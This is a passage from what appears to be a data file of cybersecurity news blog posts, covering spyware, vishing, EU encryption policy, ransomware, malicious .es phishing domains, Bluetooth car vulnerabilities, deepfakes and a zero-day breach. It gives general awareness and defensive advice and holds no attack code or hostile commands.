    <h3>🚨 Why Is This Campaign Alarming?</h3><br>
    <p>Catwatchful is notable for its:</p>
    <ul>
      <li>🌐 Global reach — affecting victims in dozens of countries</li>
      <li>📈 Scale — over 62,000 compromised accounts and growing</li>
      <li>🤐 Stealth — hiding in plain sight and avoiding detection by many antivirus tools</li>
      <li>💻 Attacker sloppiness — leaving the stolen data on an unsecured server, enabling discovery</li>
    </ul>

    <p>This shows not only how effective social engineering and sideloading attacks still are, but also how carelessly some attackers handle stolen data once collected.</p>

    <h3>🛡️ How You Can Stay Safe</h3><br>
    <p>Here’s how to defend yourself against Catwatchful and similar spyware campaigns:</p>
    <ul>
      <li>✅ Never download APKs from untrusted or unofficial sources</li>
      <li>✅ Enable Google Play Protect and use a reputable mobile security app</li>
      <li>✅ Review app permissions after installation — revoke unnecessary access</li>
      <li>✅ Don’t grant admin rights to apps you don’t fully trust</li>
      <li>✅ Keep your Android OS and apps updated with security patches</li>
      <li>✅ Regularly audit your device for suspicious apps or high data usage</li>
      <li>✅ Change passwords if you suspect compromise and enable multi-factor authentication (MFA)</li>
    </ul>

    <h3>🌟 Lessons for the Future</h3><br>
    <p>The Catwatchful incident reminds us that mobile devices are treasure troves of sensitive data — and attackers know it. With millions of Android users worldwide still sideloading apps and ignoring permissions, campaigns like Catwatchful are likely to continue thriving.</p>

    <p>Education, vigilance, and modern security tools are essential to keep your data and privacy intact.</p>

    <blockquote>🐾 A watchful cat sees everything — but so should you. Don’t let spyware stalk your phone.</blockquote>
  `},{id:"vishing-rise-australia-qantas-breach",title:"Vishing Attacks Surge in Australia Following Qantas Breach: How AI and Social Engineering Exploit the Human Factor",date:"2025-07-07",author:"Ethical Byte",summary:"Australia’s privacy watchdog reports a sharp rise in vishing attacks after the Qantas breach, exposing how attackers exploit trust and urgency to bypass digital defenses.",tags:["vishing","social engineering","qantas breach","ai phishing","australia","human factor"],imageKey:"vishingQantas",content:`
    <h3>📞 Vishing Is Back — and Smarter Than Ever</h3><br>
    <p>In the wake of the highly publicized <strong>Qantas data breach</strong>, Australia’s Office of the Australian Information Commissioner (OAIC) issued a sobering warning: <strong>vishing (voice phishing) attacks have surged by 46%</strong> nationwide.</p>

    <p>While much attention has focused on technical vulnerabilities, the Qantas breach highlights another critical weak spot — humans. Attackers are now using more sophisticated methods, even <strong>AI-generated voices</strong>, to trick employees into handing over access and data over the phone.</p>

    <h3>🔍 What Exactly Is Vishing?</h3><br>
    <p>Vishing — short for “voice phishing” — is a social engineering tactic where cybercriminals call their targets, posing as trusted figures such as IT support, managers, or even law enforcement. Their goal? To manipulate victims into providing sensitive information, approving access, or performing actions that compromise security.</p>

    <p>Recent vishing calls tied to the Qantas breach include:</p>
    <ul>
      <li>Posing as help desk technicians requesting login credentials to fix an “urgent outage”</li>
      <li>Imitating senior managers demanding immediate action to avoid penalties</li>
      <li>Using cloned AI voices to sound exactly like a known supervisor or coworker</li>
    </ul>

    <h3>🎭 Why Are Humans the Weakest Link?</h3><br>
    <p>Attackers rely on a few predictable human traits:</p>
    <ul>
      <li>⏳ <strong>Urgency</strong> — “We need this fixed NOW or the company loses money”</li>
      <li>🎩 <strong>Authority</strong> — “This is your manager. Just give me the password.”</li>
      <li>🤝 <strong>Trust</strong> — “I’m from IT. We spoke yesterday.”</li>
    </ul>

    <p>Combined with high stress environments, like customer support or call centers, these tactics often succeed — even against trained employees.</p>

    <h3>🧪 What’s New About These Attacks?</h3><br>
    <p>What makes this current wave of vishing more dangerous is the integration of <strong>artificial intelligence (AI)</strong>:</p>
    <ul>
      <li>🤖 AI voice cloning replicates tone, accent, and speech patterns of real people</li>
      <li>🎙️ Deepfake audio can even simulate conference calls or voicemails from executives</li>
      <li>📈 Attackers script dynamic, context-aware conversations instead of static pretexts</li>
    </ul>

    <p>This means employees can no longer rely on “recognizing the voice” or gut feeling alone to detect fraud.</p>

    <h3>📉 Lessons from the Qantas Breach</h3><br>
    <p>Investigators suspect that attackers gained initial access to Qantas systems by tricking a third-party call center employee via a vishing call. From there, they escalated privileges and moved laterally across networks, resulting in massive customer data exposure and operational disruption.</p>

    <p>This incident underlines the fact that even the best firewalls and endpoint protections can’t stop someone who’s verbally persuaded to open the door.</p>

    <h3>🛡️ OAIC’s Recommendations</h3><br>
    <p>The OAIC has outlined a set of best practices to defend against vishing:</p>
    <ul>
      <li>✅ Require <strong>multi-factor verification</strong> before making account changes or granting access</li>
      <li>✅ Educate employees about AI-enabled social engineering techniques</li>
      <li>✅ Empower staff to challenge and escalate suspicious calls without fear of reprimand</li>
      <li>✅ Enforce strict protocols for verifying the identity of callers requesting sensitive actions</li>
      <li>✅ Audit third-party vendors regularly and hold them to the same security standards</li>
      <li>✅ Deploy voice authentication or anomaly detection tools where applicable</li>
    </ul>

    <h3>🌎 Beyond Australia: A Global Concern</h3><br>
    <p>While this warning was issued in Australia, the threat is not limited by geography. Similar attacks have been reported in the U.S., U.K., and Asia — often tied to breaches in industries like aviation, finance, and healthcare.</p>

    <p>In our hyper-connected, high-pressure workplaces, anyone with a phone can be a target — and a gateway — for attackers.</p>

    <h3>🧠 Final Thoughts</h3><br>
    <p>The Qantas breach and subsequent vishing surge are stark reminders that cyber defense is not just about technology — it’s about people. The human element remains the most exploited vulnerability in security.</p>

    <p>Organizations that invest in awareness, clear policies, and support for employees who “pause and verify” will be far better positioned to fend off these attacks.</p>

    <blockquote>📞 Think before you speak. The voice on the line might not be who you think it is.</blockquote>
  `},{id:"eu-decrypt-private-data-protecteu",title:"The EU Wants to Decrypt Citizens’ Private Data by 2030: What It Means for Your Privacy",date:"2025-07-08",author:"Ethical Byte",summary:"The European Union’s ProtectEU plan proposes lawful access to encrypted communications by 2030 — sparking a heated debate on privacy, security, and human rights.",tags:["eu","encryption","privacy","surveillance","protecteu","human rights"],imageKey:"euProtectEU",content:`
    <h3>🔐 The EU’s ProtectEU Plan Explained</h3><br>
    <p>In July 2025, the European Union announced a controversial proposal under its <strong>ProtectEU initiative</strong> to grant law enforcement agencies <strong>lawful access to encrypted communications by 2030</strong>. The plan would effectively allow authorities to decrypt private messages sent through popular end-to-end encrypted (E2EE) platforms like <em>WhatsApp, Signal, iMessage, and others</em>.</p>

    <p>The EU argues that strong encryption—while vital for privacy—also enables criminals to operate in secrecy. ProtectEU is positioned as a way to combat <strong>child exploitation, terrorism, and organized crime</strong> without completely dismantling privacy protections.</p>

    <h3>🧪 How Would This Work?</h3><br>
    <p>The ProtectEU proposal envisions a future where technology firms build “<strong>lawful interception</strong>” solutions into their platforms, allowing authorized law enforcement—under a valid court order—to decrypt and access messages. This would require adding a <strong>backdoor mechanism</strong> to break E2EE on demand.</p>

    <h3>🕵️ Why Privacy Advocates Are Alarmed</h3><br>
    <p>Critics, including privacy groups, cybersecurity experts, and human rights organizations, argue that adding backdoors to encryption is fundamentally dangerous because:</p>
    <ul>
      <li>⚠️ <strong>Weakened Security:</strong> Any backdoor, no matter how well-intentioned, can be discovered and abused by hackers or hostile states.</li>
      <li>⚠️ <strong>Erosion of Trust:</strong> Users may stop using platforms perceived as insecure, undermining confidence in the digital ecosystem.</li>
      <li>⚠️ <strong>Scope Creep:</strong> Measures designed for one purpose (e.g., fighting terrorism) could expand to surveil dissent or target minorities.</li>
    </ul>

    <h3>⚖️ The EU’s Justification</h3><br>
    <p>The EU insists that:</p>
    <ul>
      <li>✅ Only <strong>authorized law enforcement</strong> with court oversight would have access.</li>
      <li>✅ ProtectEU aims to balance security and privacy via strict legal and technical controls.</li>
      <li>✅ They seek cooperation from tech companies to create solutions that minimize abuse risk.</li>
    </ul>

    <h3>🌍 What This Means for Users</h3><br>
    <p>If implemented, ProtectEU could reshape the way privacy and security are balanced across Europe — and potentially set a precedent globally. Users may see changes in:</p>
    <ul>
      <li>🔒 Encryption standards and app functionality</li>
      <li>📄 Privacy policies of communication platforms</li>
      <li>👀 Who can access their messages and under what conditions</li>
    </ul>

    <h3>🧠 Key Concerns & Potential Risks</h3><br>
    <ul>
      <li>Cybercriminals exploiting built-in backdoors</li>
      <li>Political misuse of surveillance powers</li>
      <li>Chilling effect on freedom of speech and journalism</li>
      <li>Fragmentation of global internet standards if users flee to services outside the EU</li>
    </ul>

    <h3>✅ What Can You Do?</h3><br>
    <p>Until ProtectEU becomes law (if it does), you can still protect your digital privacy:</p>
    <ul>
      <li>🔍 Stay informed about policy changes and debates.</li>
      <li>📣 Participate in public consultations, petitions, or advocacy efforts if you value strong encryption.</li>
      <li>🛑 Avoid platforms already weakening encryption or collecting excessive metadata.</li>
      <li>🗝️ Choose apps committed to robust, transparent, and zero-knowledge encryption as long as legally permitted.</li>
    </ul>

    <h3>🌟 Final Thoughts</h3><br>
    <p>The EU’s ProtectEU plan ignites an age-old debate: how much privacy are we willing to sacrifice for security? While stopping crime is essential, creating systemic weaknesses in encryption could endanger everyone — not just the guilty.</p>

    <blockquote>🔐 Privacy isn’t just about hiding something; it’s about protecting everyone. Once the backdoor is open, no one knows who will walk through it.</blockquote>
  `},{id:"ransomware-attack-ingram-micro-2025",title:"Ransomware Attack Disrupts Global Operations at Ingram Micro",date:"2025-07-09",author:"Ethical Byte",summary:"One of the world’s largest IT distributors, Ingram Micro, suffered a ransomware attack causing widespread outages, disrupting global supply chains, and raising serious questions about resilience in critical industries.",tags:["ransomware","ingram micro","supply chain","it distribution","incident response","cyber resilience"],imageKey:"ingramMicroRansomware",content:`
    <h3>💻 Ingram Micro Hit by Ransomware</h3><br>
    <p>Just before the July 4 holiday weekend, <strong>Ingram Micro</strong>, a critical player in global IT distribution, was targeted in a major <strong>ransomware attack</strong> that disrupted its systems and operations worldwide.</p>

    <p>The attack forced Ingram Micro to shut down parts of its network, halting customer order processing and some internal workflows to prevent further damage and limit the spread of malware. Law enforcement and cybersecurity experts were brought in immediately to investigate and assist with recovery.</p>

    <h3>🕵️ What We Know So Far</h3><br>
    <ul>
      <li>🏢 Ingram Micro confirmed its IT infrastructure was compromised by ransomware.</li>
      <li>📉 Systems handling procurement, logistics, and partner interactions went offline.</li>
      <li>🔎 No public evidence yet of stolen or leaked data, though investigations continue.</li>
      <li>⏳ Recovery is ongoing — while some services have been restored, full restoration is expected to take time.</li>
    </ul>

    <h3>🌎 Global Impact of the Outage</h3><br>
    <p>Ingram Micro’s role as an intermediary between manufacturers, resellers, and end customers means its disruption reverberates across the IT industry supply chain:</p>
    <ul>
      <li>🚫 Delays in fulfilling hardware & software orders.</li>
      <li>📦 Logistics bottlenecks for resellers & partners dependent on its distribution network.</li>
      <li>🌐 End customers experiencing extended lead times and order confusion.</li>
      <li>💰 Potential financial losses and contractual penalties for all involved parties.</li>
    </ul>

    <p>This incident highlights how a single cyberattack on a pivotal supplier can create a domino effect, disrupting hundreds or thousands of businesses downstream.</p>

    <h3>📣 Ingram Micro’s Response</h3><br>
    <p>In a statement, Ingram Micro emphasized their commitment to recovery and security:</p>
    <ul>
      <li>✅ “We are working diligently to restore operations securely and as quickly as possible.”</li>
      <li>✅ Law enforcement and third-party cybersecurity teams are involved in mitigation efforts.</li>
      <li>✅ Customers are encouraged to contact account managers for the most current updates.</li>
    </ul>

    <h3>⚖️ Why Supply Chains Are Attractive Targets</h3><br>
    <p>Supply chain hubs like Ingram Micro are lucrative ransomware targets because they touch thousands of businesses — amplifying the impact and urgency of the attack. By disrupting a critical node in the chain, attackers increase their leverage and the likelihood of ransom payments.</p>

    <p>Similar incidents have previously struck companies like Colonial Pipeline, Maersk, and Kaseya, proving this is a persistent and evolving threat.</p>

    <h3>🧪 How Ransomware Campaigns Typically Work</h3><br>
    <p>Though details of the attack are still emerging, ransomware campaigns often follow this pattern:</p>
    <ul>
      <li>🎣 Initial access via phishing, credential theft, or vulnerable systems.</li>
      <li>🛠️ Lateral movement to compromise critical servers and backups.</li>
      <li>🔒 Deployment of ransomware payload to encrypt files & systems.</li>
      <li>💰 Ransom demand in cryptocurrency in exchange for decryption keys.</li>
    </ul>

    <h3>🔐 Lessons & Recommendations for Customers and Partners</h3><br>
    <p>While Ingram Micro works to restore systems, customers and partners should take these steps:</p>
    <ul>
      <li>🔒 Stay in regular contact with your Ingram Micro representatives for updates.</li>
      <li>📑 Review and validate orders placed just before and after the outage.</li>
      <li>🛑 Be wary of phishing emails posing as Ingram Micro during recovery efforts.</li>
      <li>💼 Assess your own business continuity & disaster recovery plans to handle supplier disruptions.</li>
      <li>🌐 Consider diversifying critical suppliers where possible to reduce dependency risks.</li>
    </ul>

    <h3>🌟 Final Thoughts</h3><br>
    <p>The Ingram Micro ransomware incident is a stark reminder of the fragility of interconnected supply chains and the immense cost of insufficient cyber resilience. Protecting critical suppliers — and holding them to high security standards — is no longer optional but essential for business continuity.</p>

    <p>As attackers continue to exploit high-value nodes in global networks, organizations must prepare for not just direct attacks but also collateral damage from breaches in their ecosystem.</p>

    <blockquote>💻 In supply chains, you’re only as strong as your weakest link. Stay vigilant, diversify risk, and build resilience before the next attack hits.</blockquote>
  `},{id:"malicious-es-domains-cloudflare",title:"Malicious .es Domains Surge: Hosted on Cloudflare, Random Names Help Defenders Spot Them",date:"2025-07-10",author:"Ethical Byte",summary:"Researchers report a 19× rise in malicious .es domains hosted on Cloudflare, using randomly generated names for phishing — which ironically makes them easier to detect.",tags:[".es domains","phishing","cloudflare","malware","domain security","tld threats"],imageKey:"maliciousEsDomains",content:`
    <h3>🌐 Malicious .es Domains on the Rise</h3><br>
    <p>According to a July 2025 report from <strong>Cofense</strong>, security researchers have detected a sharp <strong>19× increase</strong> in malicious domains using Spain’s country-code TLD (<strong>.es</strong>) over the past six months.</p>

    <p>Nearly all of these domains were hosted via <strong>Cloudflare</strong>, which attackers exploit for its fast content delivery, global reach, and masking capabilities. But while this makes the campaigns effective, it also leaves behind clues defenders can use.</p>

    <h3>🕵️ What Makes These Domains Suspicious?</h3><br>
    <p>Researchers noticed that these malicious domains featured <strong>machine-generated, random-looking subdomain names</strong> — nonsensical strings of characters that are highly unlikely to belong to legitimate Spanish businesses.</p>

    <p>Examples include domains like:</p>
    <ul>
      <li>ag7sr.fjlabpkgcuo.es</li>
      <li>f9bxk.ztrmqvyheso.es</li>
      <li>qx1jp.lkhdxvenbty.es</li>
    </ul>

    <p>These names are generated automatically so attackers can spin up thousands of unique domains rapidly and bypass traditional blocklists.</p>

    <h3>⚠️ Why It Matters</h3><br>
    <ul>
      <li>🚩 Random names help attackers evade blocklists but also make them stand out to defenders.</li>
      <li>🌍 Many phishing campaigns spoof well-known brands but use meaningless domains, which savvy users and tools can catch.</li>
      <li>🔓 Hosting on Cloudflare provides attackers with anonymity and performance, but defenders can monitor .es TLD traffic for anomalies.</li>
    </ul>

    <h3>📧 How Are These Domains Used?</h3><br>
    <p>The vast majority of these domains are used for <strong>credential phishing campaigns</strong> targeting major global brands. Cofense’s analysis showed:</p>
    <ul>
      <li>Microsoft — spoofed in 95% of observed campaigns</li>
      <li>Adobe</li>
      <li>Google</li>
      <li>DocuSign</li>
      <li>U.S. Social Security Administration</li>
    </ul>

    <p>Beyond phishing, a smaller number of domains delivered malware, including Remote Access Trojans (RATs) like <strong>XWorm</strong>, <strong>Dark Crystal</strong>, and <strong>ConnectWise</strong>.</p>

    <h3>🔐 What Can Defenders Do?</h3><br>
    <p>Fortunately, the randomness of these domains provides a useful detection opportunity. Defenders are encouraged to:</p>
    <ul>
      <li>✅ Implement domain heuristics to detect and block nonsensical, random-looking names.</li>
      <li>✅ Actively monitor .es TLD traffic, even if your organization doesn’t have Spanish operations.</li>
      <li>✅ Be wary of domains hosted on Cloudflare with no branding or clear ownership.</li>
      <li>✅ Educate employees about phishing tactics, especially those spoofing major brands.</li>
    </ul>

    <h3>📊 Example Pattern of Suspicious Domains</h3><br>
    <p>Below are examples of the kinds of domains flagged by researchers:</p>
    <ul>
      <li>ag7sr.fjlabpkgcuo.es</li>
      <li>r4ykp.hdlmcxzqjvo.es</li>
      <li>j2kxl.ptnvhwyeqrz.es</li>
    </ul>

    <p>Note the meaningless subdomains and their use of .es — patterns defenders can use to build detection rules.</p>

    <h3>🧠 Final Thoughts</h3><br>
    <p>Attackers will continue innovating, but sometimes their automation creates obvious patterns. These .es domains are a perfect example: randomized names intended to evade blocklists actually make them <strong>easier for defenders to flag</strong>.</p>

    <blockquote>🌐 Stay vigilant. Look beyond the TLD — focus on patterns and anomalies that attackers can’t hide.</blockquote>
  `},{id:"perfektblue-bluetooth-car-hacking",title:"PerfektBlue Attack Exposes Millions of Connected Vehicles to Remote Bluetooth Hacking",date:"2025-07-11",author:"Ethical Byte",summary:"Critical vulnerabilities in a popular Bluetooth stack expose millions of vehicles to remote hacking. Here’s everything you need to know about PerfektBlue and how to protect yourself.",tags:["perfektblue","bluetooth","car hacking","automotive cybersecurity","openskynergy","iot security"],imageKey:"perfektBlueCarHack",content:`
    <h3>🚗 PerfektBlue: A New Threat to Connected Vehicles</h3><br>
    <p>On July 11, researchers uncovered a set of critical vulnerabilities in <strong>OpenSynergy’s Blue SDK</strong> — a Bluetooth protocol stack integrated into millions of connected vehicles around the world. This attack, named <strong>PerfektBlue</strong>, highlights how attackers can exploit flaws in the car’s wireless interface to gain control without even touching it.</p>

    <h3>🪲 What Happened?</h3><br>
    <p>The vulnerabilities lie in the way Blue SDK processes certain malformed Bluetooth packets. Attackers within wireless range can craft malicious packets to crash the Bluetooth stack or gain control over the car’s infotainment and diagnostic systems — potentially even affecting safety-critical components.</p>

    <p>This means attackers can:</p>
    <ul>
      <li>🎙️ Eavesdrop on conversations or data transmissions.</li>
      <li>🖥️ Inject malicious code into vehicle systems.</li>
      <li>⚠️ Manipulate driver-assist features or disable alerts.</li>
    </ul>

    <h3>📡 Why It Matters</h3><br>
    <p>Modern vehicles are essentially mobile computers — and Bluetooth is a key interface for drivers to connect their devices. With PerfektBlue, attackers can bypass physical security measures entirely, attacking cars wirelessly from a parking lot, street, or even another vehicle.</p>

    <p>Such attacks could expose personal data, interfere with driving, or serve as a stepping stone for further compromises — a significant risk as cars become increasingly autonomous and connected.</p>

    <h3>🧪 How Does the Attack Work?</h3><br>
    <p>The flaw comes from improper validation of malformed or malicious Bluetooth messages by the Blue SDK. Attackers use a laptop and a Bluetooth antenna to craft packets that exploit these flaws, leading to:</p>
    <ul>
      <li>🚫 Denial of service (crashing the stack).</li>
      <li>📥 Remote code execution inside the vehicle’s systems.</li>
    </ul>

    <p>Since Bluetooth has a limited range, attackers must be within tens of meters — but in crowded urban areas or parking structures, that’s trivial to achieve.</p>

    <h3>🛞 Who’s Affected?</h3><br>
    <ul>
      <li>✅ Vehicles from multiple, yet-unnamed manufacturers that use OpenSynergy’s Blue SDK.</li>
      <li>✅ Infotainment units and possibly other IoT devices built with the same stack.</li>
    </ul>

    <p>Researchers have notified OpenSynergy, which is preparing and distributing patches to automakers and vendors.</p>

    <h3>🚨 Real-World Scenario</h3><br>
    <p>Picture this: you park your car at a mall. A hacker nearby scans for vulnerable vehicles. They send crafted Bluetooth packets to your car, crashing its infotainment system, stealing contact lists, or disabling driver-assist warnings — all without touching the car. PerfektBlue turns a harmless convenience into a dangerous backdoor.</p>

    <h3>🔧 What You Should Do</h3><br>
    <p><strong>For Automakers & Suppliers:</strong></p>
    <ul>
      <li>✅ Deploy OpenSynergy’s firmware updates as soon as available.</li>
      <li>✅ Inform customers about risks and patch timelines transparently.</li>
      <li>✅ Audit current vehicle configurations for Bluetooth security posture.</li>
    </ul>

    <p><strong>For Drivers:</strong></p>
    <ul>
      <li>📱 Contact your dealer/service center and ask about software updates.</li>
      <li>🔒 Turn off Bluetooth when not in use to minimize exposure.</li>
      <li>🚨 Pay attention to strange behavior in your infotainment or safety systems and report it.</li>
    </ul>

    <p><strong>For Security Teams:</strong></p>
    <ul>
      <li>🧪 Test all patches thoroughly before rollout.</li>
      <li>📡 Monitor for suspicious Bluetooth activity in parking lots and corporate facilities.</li>
      <li>🔬 Regularly review and harden your fleet’s wireless configurations.</li>
    </ul>

    <h3>🌟 Key Lessons</h3><br>
    <p>The PerfektBlue attack reminds us that every connected feature comes with risk. Cars, like smartphones and laptops, need constant vigilance and updates to stay secure. Bluetooth is convenient, but also a gateway — and attackers are watching.</p>

    <blockquote>🚗 Treat your car like your phone: every wireless connection is a potential door. Make sure you’re the only one holding the keys.</blockquote>
  `},{id:"cyber-talk-july",title:"Join Us for Cyber Talk 2025 – Your Questions, Answered!",date:"2025-07-12",author:"Team EthicalByte",summary:"A live, interactive cybersecurity event hosted by EthicalByte’s CEO , COO & CTO, where we decode trends, certifications, tools, and career paths in cyber. Register now and take the first step toward your future in cybersecurity.",tags:["event","cybersecurity career","certifications","ethicalbyte","future of cybersecurity"],imageKey:"cyberTalk2025Banner",content:`
    <div style="background-color:#f5f7fa;padding:20px;border-radius:12px;border:1px solid #ddd;">
      <h3 style="color:#1e2f48;margin-top:0;">🚨 <br> Cyber Talk 2025 <br>Live Cybersecurity Career Event</h3><br>
      <p><strong>Hosted by:</strong> EthicalByte CEO, COO & CTO</p>
      <p><strong>Date:</strong> July 12, 2025</p>
      <p><strong>Format:</strong> Virtual + Interactive Q&A</p>
      <p>Whether you're a beginner or already exploring the cybersecurity space, this event is designed to give you clarity, direction, and insider knowledge on how to grow in cybersecurity in 2026 and beyond.</p>
      
      <div style="text-align:center; margin: 20px 0;">
        <a href="https://tally.so/r/3j4aN1" target="_blank" style="background:#2563eb;color:#fff;padding:12px 24px;border-radius:6px;text-decoration:none;font-weight:bold;display:inline-block;">📩 Register Now</a>
      </div>
      
      <h3>📌 What We’ll Cover</h3><br>
      <ul>
        <li><strong>Do you need cybersecurity certifications?</strong> Which ones actually matter in 2026?</li>
        <li><strong>Should you pursue a degree in cybersecurity?</strong> Pros, cons, and alternatives.</li>
        <li><strong>What should you learn first?</strong> Tools, skills, and the right mindset for beginners.</li>
        <li><strong>Is coding required?</strong> What domains need it—and which don’t.</li>
        <li><strong>Building a home lab:</strong> Tools, platforms, and legal hacking practice.</li>
        <li><strong>How to land your first job or internship?</strong> Resume tips, portfolio advice, and where to apply.</li>
        <li><strong>Specialist or generalist?</strong> Choosing your cybersecurity path smartly.</li>
      </ul>

      <h3>🎙️ Expert Panel</h3><br>
      <p>This session will be hosted by our <strong>CEO</strong> and <strong>CTO , COO</strong> who bring years of industry knowledge, startup experience, and mentorship insights. Expect practical advice—not just theory.</p>

      <h3>🛠️ Interactive Q&A</h3><br>
      <p>Ask anything! We’ll be answering live questions from the audience. Whether it’s about hacking tools, certifications, lab setup, or career doubts—this is your chance to ask directly.</p>

      <h3>🎯 Who Should Attend?</h3><br>
      <ul>
        <li>College students exploring cybersecurity</li>
        <li>Beginners who want to enter the field in 2026</li>
        <li>Professionals looking to upskill or switch careers</li>
        <li>Anyone curious about certifications, hacking tools, or job preparation</li>
      </ul>

      <h3>🚀 Why Attend?</h3><br>
      <p>This is not just a session—it’s a career starter. Real strategies. Real clarity. From real experts. Let EthicalByte help you plan your journey into the world of cybersecurity.</p>

      <div style="margin-top:30px;text-align:center;">
        <a href="https://tally.so/r/3j4aN1" target="_blank" style="background:#007bff;color:#fff;padding:14px 28px;border-radius:8px;text-decoration:none;font-size:16px;font-weight:bold;">🚀 Secure Your Seat</a>
      </div>
    </div>
  `},{id:"rise-of-deepfake-attacks",title:"The Rise of Deepfake Attacks: A Growing Cybersecurity Nightmare",date:"2025-07-11",author:"Harshit Agarwal & Dr. Neetha S.S",summary:"Deepfakes have evolved from harmless fun to a dangerous cyber threat undermining trust itself. This blog explores how deepfake attacks work, real-world examples, and how individuals & organizations can defend against them.",tags:["deepfake","cybersecurity","AI threats","trust","Christ University"],imageKey:"deepfakeThreatBanner",content:`
    <div style="padding:20px;border-radius:12px;border:1px solid #ddd;">
      
      <h3>When AI Becomes a Weapon: The New Reality of Deepfake Attacks</h3><br>
      <p>Deepfakes started as a novelty—funny memes, celebrity face swaps, or creative videos. But those days of innocent entertainment are gone. Today, deepfake technology has evolved into a sophisticated weapon in the hands of cybercriminals, capable of causing reputational, financial, and even geopolitical damage.</p>
      
      <p>Unlike traditional cyber threats that target systems and data, deepfakes target something far more valuable: <strong>trust</strong>. If you can’t believe what you see or hear, human communication itself starts to crumble. With the rapid evolution of AI, these attacks are becoming more frequent, convincing, and dangerous.</p>
      
      <h3>Anatomy of a Deepfake Attack</h3><br>
      <p>Picture this: you’re a finance manager, and you receive a video call from your CEO urgently asking to transfer ₹4 crores to a vendor. The voice, the face — everything seems authentic, but something feels … off. Welcome to the new era of CEO fraud, powered by deepfakes.</p>
      
      <p>Deepfakes use AI to craft hyper-realistic audio and video, indistinguishable from reality to the untrained eye. Here are some ways cybercriminals exploit this technology:</p>
      <ul>
        <li><strong>CEO Fraud 2.0:</strong> Instead of spoofed emails, attackers now create convincing video calls requesting urgent fund transfers.</li>
        <li><strong>Disinformation Avalanche:</strong> Fake videos manipulate stock prices, sway elections, and damage reputations in hours.</li>
        <li><strong>Identity Theft on Steroids:</strong> Synthetic videos of individuals are used for blackmail, fraud, or harassment.</li>
        <li><strong>The Revenge Factor:</strong> Personal vendettas turn digital with deepfake-driven harassment and psychological trauma.</li>
      </ul>

      <p>In 2023, a major energy company lost over $240,000 after a deepfake audio of their CFO was used to convince an employee to authorize a transfer. Similar attacks have targeted political campaigns, celebrities, and even journalists—showing how no one is immune.</p>

      <h3>The Science Behind the Deception</h3><br>
      <p>At the core of deepfakes lie <strong>Generative Adversarial Networks (GANs)</strong> — two AI systems in constant battle. One generates fake content while the other tries to detect it, improving each iteration until the fake becomes indistinguishable from reality. This adversarial training process makes deepfakes more sophisticated with each generation.</p>
      
      <p>This technology, once confined to research labs, is now easily accessible through open-source software and even mobile apps. With just a smartphone and some creativity, anyone can create a deepfake convincing enough to deceive colleagues, clients, and even family members.</p>

      <h3>Why Are Deepfakes So Effective?</h3><br>
      <p>Humans are hardwired to trust their senses. Seeing is believing—or so we thought. Deepfakes exploit this cognitive bias, creating an emotional response before critical thinking kicks in. Moreover, in moments of urgency—like financial requests or crises—victims are less likely to pause and verify authenticity.</p>

      <p>This psychological manipulation makes deepfakes not just a technical challenge, but a human one too.</p>

      <h3>Fighting Fire with Fire: How to Defend Against Deepfakes</h3><br>
      <p>While deepfakes are advancing rapidly, so are our defense mechanisms. Here are actionable strategies:</p>

      <h3>1️⃣ Train Your Human Firewall</h3><br>
      <ul>
        <li><strong>Trust but Verify:</strong> Institute mandatory verification protocols for financial and sensitive requests.</li>
        <li><strong>Spot the Signs:</strong> Look for unnatural blinking, inconsistent lighting, poor lip-syncing, robotic audio—these are common giveaways.</li>
        <li><strong>Conduct Deepfake Drills:</strong> Make security training engaging and realistic by simulating deepfake scenarios.</li>
      </ul>

      <h3>2️⃣ Deploy the Tech Arsenal</h3><br>
      <ul>
        <li><strong>Watermarking:</strong> Embed invisible digital fingerprints in authentic content to verify originality.</li>
        <li><strong>AI vs. AI:</strong> Use AI tools that analyze pixel-level anomalies and voiceprint patterns to detect deepfakes.</li>
        <li><strong>Next-Gen Biometrics:</strong> Move beyond facial recognition to heartbeat patterns, breathing analysis, and subtle micro-expressions.</li>
      </ul>

      <h3>3️⃣ Build a Security-First Culture</h3><br>
      <ul>
        <li>Encourage skepticism without fostering fear.</li>
        <li>Use multiple communication channels for critical decisions—don’t rely solely on video or audio.</li>
        <li>Stay informed about the latest deepfake trends and detection tools.</li>
      </ul>

      <h3>The Road Ahead: A Personal Reflection</h3><br>
      <p>Deepfakes challenge a fundamental human assumption: that our senses don’t lie. But like any disruptive technology, they bring both risks and opportunities. With awareness, education, and the right tools, we can turn the tide.</p>
      
      <p>We must remain vigilant without succumbing to paranoia, skeptical yet humane, and harness technology to defend rather than fear. In the battle between authentic human connection and artificial deception, we still have the upper hand—if we’re smart and proactive about it.</p>

      <h3>Real-World Case Study: The Power of a Single Deepfake</h3><br>
      <p>In 2024, a fabricated video of a political leader making inflammatory statements went viral overnight, sparking protests and a temporary market crash. Analysts later confirmed it was a deepfake—but the damage was already done. This illustrates the urgency of building resilience against such attacks at both individual and institutional levels.</p>

      <h3>About the Authors</h3><br>
      <p><strong>Harshit Agarwal</strong> is a BCA student at Christ University with a focus on cybersecurity and emerging digital threats.</p>
      <p><strong>Dr. Neetha S.S</strong> is an Assistant Professor of Computer Science at Christ University, specializing in cybersecurity, AI, and digital forensics. Together, they bring academic insight and fresh perspective into the growing menace of deepfakes.</p>
    </div>
  `},{id:"nippon-steel-zero-day",title:"Nippon Steel Confirms Zero-Day Attack Exposed Sensitive Data",date:"2025-07-12",author:"EthicalByte",summary:"Japan’s largest steelmaker, Nippon Steel, suffered a sophisticated zero-day cyberattack that exposed business partner, customer, and employee information. This incident underscores the vulnerability of industrial giants to advanced threats.",tags:["zero-day","nippon steel","manufacturing security","data breach","industrial cybersecurity"],imageKey:"nipponSteelBreachBanner",content:`
    <div style="padding:20px;border-radius:12px;border:1px solid #ddd;">
      
      <h3>🔍 <br> Cybersecurity Incident: Nippon Steel Hit by Zero-Day Attack</h3><br>
      <p>In a stark reminder that no organization is immune, <strong>Nippon Steel</strong>, Japan’s largest steelmaker and a cornerstone of global manufacturing, confirmed it fell victim to a sophisticated <strong>zero-day cyberattack</strong>. The breach resulted in unauthorized access to sensitive data — a wake-up call for industries worldwide.</p>

      <h3>What Happened?</h3><br>
      <p>According to the company’s disclosure:</p>
      <ul>
        <li>Attackers exploited a previously unknown <strong>zero-day vulnerability</strong> in one of Nippon Steel’s internal systems.</li>
        <li>They gained <strong>unauthorized access</strong> to three major categories of data:</li>
        <ul>
          <li>📁 Business partner information</li>
          <li>👥 Customer records</li>
          <li>👤 Employee data</li>
        </ul>
        <li>The company has not yet revealed which software or system was compromised — likely to avoid tipping off other potential attackers.</li>
      </ul>

      <h3>Why Does This Matter?</h3><br>
      <p>This incident underscores two critical truths:</p>
